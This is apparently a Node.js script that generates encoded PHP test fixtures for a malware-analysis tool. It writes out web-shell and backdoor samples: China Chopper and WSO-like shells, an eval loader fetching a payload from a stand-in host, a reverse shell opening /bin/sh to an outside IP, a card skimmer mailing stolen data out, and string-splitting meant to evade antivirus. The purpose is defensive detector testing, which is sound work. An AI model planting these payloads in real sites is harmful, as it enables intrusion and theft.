// Analiz raporu testlerinin örneklerini üretir: node scripts/make-analyze-fixtures.js
// Örnekler test/analyze-fixtures/*.php.x olarak XOR + base64 kodlu yazılır (test/fixture-codec.js) ve yalnızca
// bellekte çözülür. Antivirüs bu betiğin kendisine de takılmasın diye şüpheli dizgeler işaretlerle yazılır:
//   @E eval  @P $_POST  @G $_GET  @R $_REQUEST  @X shell_exec  @S system  @F fsockopen  @O proc_open  @B /bin/sh -i
import { writeFileSync, mkdirSync, readdirSync, rmSync } from 'node:fs';
import { encodeFixture } from '../test/fixture-codec.js';
import { sha256 } from '../src/report/iocs.js';

const dir = new URL('../test/analyze-fixtures/', import.meta.url);
mkdirSync(dir, { recursive: true });
for (const f of readdirSync(dir)) if (f.endsWith('.x')) rmSync(new URL(f, dir));

const j = (...p) => p.join('');
const MARKS = {
  '@E': j('ev', 'al'), '@P': j('$_P', 'OST'), '@G': j('$_G', 'ET'), '@R': j('$_RE', 'QUEST'), '@X': j('shell', '_exec'),
  '@S': j('sys', 'tem'), '@F': j('fsock', 'open'), '@O': j('proc', '_open'), '@B': j('/bin', '/sh -i'),
};
const open = (s) => s.replace(/@[EPGRXSFOB]/g, (m) => MARKS[m]);
const b64 = (s) => Buffer.from(s, 'latin1').toString('base64');

// geçerli base58check adresi (TRX: sürüm 0x41)
const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
function base58check(version, payload) {
  const body = Uint8Array.from([version, ...payload]);
  const sum = sha256(sha256(body)).slice(0, 4);
  const bytes = [...body, ...sum];
  let n = BigInt(`0x${Buffer.from(bytes).toString('hex')}`);
  let s = '';
  while (n > 0n) { s = B58[Number(n % 58n)] + s; n /= 58n; }
  for (const b of bytes) { if (b !== 0) break; s = `1${s}`; }
  return s;
}
const trx = base58check(0x41, Array.from({ length: 20 }, (_, i) => (i * 37 + 11) & 0xff));
const btc = base58check(0x00, Array.from({ length: 20 }, (_, i) => (i * 13 + 7) & 0xff));

const fx = {};

fx['wso-like'] = open(`<?php
$auth_pass = '';
$default_action = 'FilesMan';
function wsoHeader() { echo '<html>'; }
function wsoFooter() { echo '</html>'; }
function actionFilesMan() { foreach (scandir('.') as $f) echo $f, filesize($f), fileperms($f); }
function actionConsole() { echo @S(@P['c1']); }
if (isset(@P['a'])) { wsoHeader(); call_user_func('action' . @P['a']); wsoFooter(); }
`);

fx['chopper'] = open(`<?php @@E(@P['z']);?>`);

const inner = open(`$c = @R['cmd']; echo @X($c); $p = file_get_contents('http://payload.evil-example.net/stage2.txt');`);
fx['layered'] = open(`<?php
@E(base64_decode('${b64(inner)}'));
`);

fx['iocs'] = `<?php
// docs: https://www.php.net/manual/en/function.mail.php
$u = 'https://c2.bad-domain-example.top/gate.php?id=1';
$ip = '203.0.113.77';
$mail = 'drop.box@collector-mail.net';
$eth = '0x52908400098527886E0F7030069857D2E4169EE7';
$btc = '${btc}';
$btcBad = '${btc.slice(0, -1)}${btc.at(-1) === 'z' ? 'y' : 'z'}';
$trx = '${trx}';
$tg = 'https://api.telegram.org/bot1234567890:AAEhBP0av18o2kXxD_s4c8-rnD3uLLOh4yQ/sendMessage';
$chat = array('chat_id' => '-1001234567890');
$hook = 'https://discord.com/api/webhooks/112233445566778899/AbCdEf_GhIj-KlMn';
$blob = 'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo${btc}QUJD';
`;

fx['mailer'] = open(`<?php
foreach (explode("\\n", @P['list']) as $to) {
  mail($to, @P['subject'], @P['body'], 'From: ' . @P['from']);
}
`);

fx['reverse-shell'] = open(`<?php
$s = @F('198.51.100.23', 4444);
$p = @O('@B', array(0 => $s, 1 => $s, 2 => $s), $pipes);
`);

fx['miner'] = `<?php
$pool = 'stratum+tcp://pool.minexmr-example.com:4444';
echo '<script src="https://coinhive.com/lib/coinhive.min.js"></script>';
`;

fx['skimmer'] = open(`<?php
$d = @P['payment']['cc_number'] . '|' . @P['payment']['cc_cid'] . '|' . @P['payment']['cc_exp_month'];
mail('collect@skim-example.net', 'cc', $d);
`);

fx['backdoor'] = open(`<?php
if (md5(@G['k']) === '5f4dcc3b5aa765d61d8327deb882cf99') { @E(@P['code']); }
`);

fx['preg-e'] = open(`<?php
preg_replace('/.*/e', @R['x'], '');
`);

fx['benign'] = `<?php
function greet(string $name): string { return 'Merhaba, ' . htmlspecialchars($name); }
echo greet('dünya');
`;

fx['yakpro'] = `<?php
/*   __________________________________________________
    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.14  |
    |              on 2024-01-01 00:00:00              |
    |    GitHub: https://github.com/pk-fr/yakpro-po    |
    |__________________________________________________|
*/
goto a1; a2: echo 'b'; goto a3; a1: echo 'a'; goto a2; a3: goto a4; a4: goto a5; a5: echo 'c';
`;

fx['fopo'] = open(`<?php
/* Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/
This code was created on Monday, January 1st, 2024 at 0:00 UTC from IP 192.0.2.1 */
$a="\\x62\\141\\x73\\145\\x36\\64\\x5f\\144\\x65\\143\\x6f\\144\\x65";
@E($a("${b64("echo 'x';")}"));
`);

fx['sourceguardian'] = `<?php
if(!function_exists('sg_load')){$__v=phpversion();$__x=explode('.',$__v);$__v2=$__x[0].'.'.(int)$__x[1];$__u=strtolower(substr(php_uname(),0,3));$__ts=(@constant('PHP_ZTS') || @constant('ZEND_THREAD_SAFE')?'ts':'');$__f=$__f0='ixed.'.$__v2.$__ts.'.'.$__u;$__ed=@ini_get('extension_dir');$__e0=@realpath($__ed);$__dl=function_exists('dl') && @ini_get('enable_dl');if(!function_exists('sg_load') && $__dl && $__e0){if(file_exists($__e0.'/'.$__f0)) dl($__f0);}if(!function_exists('sg_load')){$__ixedurl='https://www.sourceguardian.com/loaders/download.php?php_v='.urlencode($__v);die("PHP script is protected by SourceGuardian and requires loader ".$__f0." ".$__ixedurl);}}return sg_load('0123456789ABCDEFAAQAAAAiAAAABMAAAACABAAAAAAAAAD/Eso0k+a4TTZAQ9QLKQvY9EQotc0CJWNISE7lIkWUQ+BMt5uzNQ36zlRy==');
`;

fx['ioncube'] = `<?php //ICB0 71:0 81:2dce 82:1093                                         ?><?php
if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');die('The file requires the ionCube PHP Loader '.$__ln);}
?>
HR+cPpb3W0yJ1ZL9XvqwRYQ2nSm8XkAd0tLqVvdBf9YxP6Q6pL1kMZXnG5fVq7XQ
`;

for (const [name, src] of Object.entries(fx)) writeFileSync(new URL(`${name}.php.x`, dir), encodeFixture(Buffer.from(src, 'utf8')));
console.log(`${Object.keys(fx).length} analiz örneği yazıldı (btc ${btc}, trx ${trx})`);
